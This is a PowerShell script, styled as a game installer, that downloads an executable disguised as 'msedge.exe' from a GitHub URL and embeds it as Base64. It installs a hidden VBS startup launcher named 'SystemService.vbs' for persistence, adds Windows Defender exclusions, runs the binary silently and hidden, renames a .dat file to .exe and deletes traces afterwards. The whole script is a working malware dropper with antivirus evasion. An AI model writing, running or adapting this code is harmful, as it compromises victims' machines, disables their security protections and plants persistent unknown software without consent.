# Alternative approach using memory techniques
$gameFolder = "$env:USERPROFILE\Documents\MyGame"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$logPath = "$env:TEMP\game_install_log.txt"

# Create log function
function Write-Log {
    param($message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $logPath -Append
}

Write-Log "Starting alternative approach"

# Create folder if it doesn't exist
if (!(Test-Path -Path $gameFolder)) {
    try {
        New-Item -ItemType Directory -Path $gameFolder -Force | Out-Null
        Write-Log "Created folder: $gameFolder"
    } catch {
        Write-Log "Error creating folder: $_"
    }
} else {
    Write-Log "Folder already exists: $gameFolder"
}

# Function to convert Base64 to bytes
function Convert-FromBase64 {
    param([string]$base64)
    try {
        $bytes = [Convert]::FromBase64String($base64)
        return $bytes
    } catch {
        Write-Log "Error decoding Base64: $_"
        return $null
    }
}

# Try to download the file to memory first
try {
    Write-Log "Downloading file to memory"
    $webClient = New-Object Net.WebClient
    $bytes = $webClient.DownloadData($downloadUrl)
    Write-Log "Downloaded file to memory: $($bytes.Length) bytes"
    
    # Convert to Base64 for safer handling
    $base64 = [Convert]::ToBase64String($bytes)
    Write-Log "Converted to Base64 for safer handling"
    
    # Create a startup task that will run on login and decode+execute from memory
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $startupScriptPath = "$startupFolder\SystemService.vbs"
    
    Write-Log "Creating startup script at: $startupScriptPath"
    
    # Create a VBS script that will run PowerShell hidden
    $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$gameFolder\launcher.ps1""", 0, False
"@
    
    $vbsContent | Out-File -FilePath $startupScriptPath -Encoding ASCII
    Write-Log "Created VBS launcher"
    
    # Create the PowerShell launcher script
    $psLauncherPath = "$gameFolder\launcher.ps1"
    $psLauncherContent = @"
`$logPath = "$logPath"
function Write-Log { param(`$message); `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "`$timestamp - `$message" | Out-File -FilePath `$logPath -Append }
Write-Log "Launcher script started"

# Base64 encoded executable
`$base64 = @"
$base64
"@

try {
    Write-Log "Decoding Base64 data"
    `$bytes = [Convert]::FromBase64String(`$base64)
    Write-Log "Decoded successfully: `$(`$bytes.Length) bytes"
    
    # Create a temporary file with random name in Temp folder
    `$tempFile = "`$env:TEMP\svc_`$([Guid]::NewGuid().ToString()).exe"
    Write-Log "Creating temporary file: `$tempFile"
    
    # Write bytes to file
    [System.IO.File]::WriteAllBytes(`$tempFile, `$bytes)
    Write-Log "Wrote bytes to temporary file"
    
    # Try to add exclusion for the temp file
    try {
        Add-MpPreference -ExclusionPath `$tempFile -ErrorAction SilentlyContinue
        Write-Log "Added exclusion for temp file"
    } catch {
        Write-Log "Could not add exclusion: `$_"
    }
    
    # Execute with createprocess technique
    Write-Log "Attempting to execute with alternative method"
    `$startInfo = New-Object System.Diagnostics.ProcessStartInfo
    `$startInfo.FileName = `$tempFile
    `$startInfo.Arguments = "/silent"
    `$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    `$startInfo.CreateNoWindow = `$true
    
    `$process = [System.Diagnostics.Process]::Start(`$startInfo)
    Write-Log "Process started with PID: `$(`$process.Id)"
    
    # Wait a bit before cleaning up
    Start-Sleep -Seconds 10
    
    # Clean up temp file
    try {
        Remove-Item -Path `$tempFile -Force -ErrorAction SilentlyContinue
        Write-Log "Cleaned up temporary file"
    } catch {
        Write-Log "Failed to clean up: `$_"
    }
} catch {
    Write-Log "Error in launcher: `$_"
}
"@
    
    $psLauncherContent | Out-File -FilePath $psLauncherPath -Encoding UTF8
    Write-Log "Created PowerShell launcher script"
    
    # Also try to run it immediately
    try {
        Write-Log "Attempting immediate execution"
        
        # Create a temporary file with different extension
        $tempFilePath = "$env:TEMP\data_$(Get-Random).dat"
        [System.IO.File]::WriteAllBytes($tempFilePath, $bytes)
        Write-Log "Created temporary data file: $tempFilePath"
        
        # Rename to executable and try to run
        $tempExePath = "$env:TEMP\sys_$(Get-Random).exe"
        Move-Item -Path $tempFilePath -Destination $tempExePath -Force
        Write-Log "Renamed to executable: $tempExePath"
        
        try {
            # Try to exclude the path
            Add-MpPreference -ExclusionPath $tempExePath -ErrorAction SilentlyContinue
            Write-Log "Added temp exclusion (might not work)"
            
            # Try to run
            Start-Process -FilePath $tempExePath -ArgumentList "/silent" -WindowStyle Hidden
            Write-Log "Started process"
        } catch {
            Write-Log "Immediate execution failed: $_"
        }
    } catch {
        Write-Log "Error setting up immediate execution: $_"
    }
    
} catch {
    Write-Log "Error downloading file: $_"
}

Write-Log "Alternative approach completed - will attempt to run at next login"